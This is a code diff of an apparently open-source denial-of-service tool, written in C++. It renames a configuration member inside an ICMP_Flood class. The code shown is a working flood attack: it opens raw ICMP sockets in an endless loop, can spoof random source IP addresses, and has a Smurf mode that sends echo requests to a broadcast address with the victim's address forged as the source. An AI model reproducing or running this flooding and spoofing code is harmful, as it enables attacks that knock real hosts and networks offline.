@@ -9,8 +9,8 @@
 
 void ICMP_Flood::attack() {
     std::vector<int> sockets;
-    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
-    for (int x = 0; x < conf->CONNECTIONS; x++) {
+    sockets.reserve(static_cast<unsigned long>(config->CONNECTIONS));
+    for (int x = 0; x < config->CONNECTIONS; x++) {
         sockets.emplace_back(0);
     }
     char buf[400];
@@ -21,21 +21,21 @@ void ICMP_Flood::attack() {
     struct hostent *hp;
     struct sockaddr_in dst{};
     while(true){
-        for(int x = 0;x < conf->CONNECTIONS; x++){
+        for(int x = 0;x < config->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
             if(!sockets[x]){
                 sockets[x] = make_socket(IPPROTO_ICMP);
             }
 
-            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
+            if((hp = gethostbyname(config->website.c_str())) == nullptr){
+                if((ip->daddr = inet_addr(config->website.c_str())) == -1){
                     print_error("Can't resolve the host");
                     exit(EXIT_FAILURE);
                 }
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if(conf->RandomizeSource){
+            if(config->RandomizeSource){
                 std::string ipaddr{};
                 Randomizer::randomIP(ipaddr);
                 if((ip->saddr = inet_addr(ipaddr.c_str())) == -1){
@@ -57,10 +57,10 @@ void ICMP_Flood::attack() {
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
             }else{
-                (*conf->req)++;
+                (*config->req)++;
             }
         }
-        (*conf->voly)++;
+        (*config->voly)++;
         pause();
     }
 }
@@ -70,7 +70,7 @@ ICMP_Flood::ICMP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(std::move(c
 }
 
 void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
-    switch (conf->vector){
+    switch (config->vector){
         case Config::ICMPFlood:
             icmp->type = static_cast<u_int8_t>(Randomizer::randomInt(1, 30));
             icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 15));
@@ -82,8 +82,8 @@ void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
         case Config::Smurf:
             icmp->type = ICMP_ECHO;
             icmp->code = ICMP_NET_UNREACH;
-            ip->daddr = inet_addr(conf->broadcast.c_str());
-            ip->saddr = inet_addr(conf->website.c_str());
+            ip->daddr = inet_addr(config->broadcast.c_str());
+            ip->saddr = inet_addr(config->website.c_str());
         default:break;
     }
 }
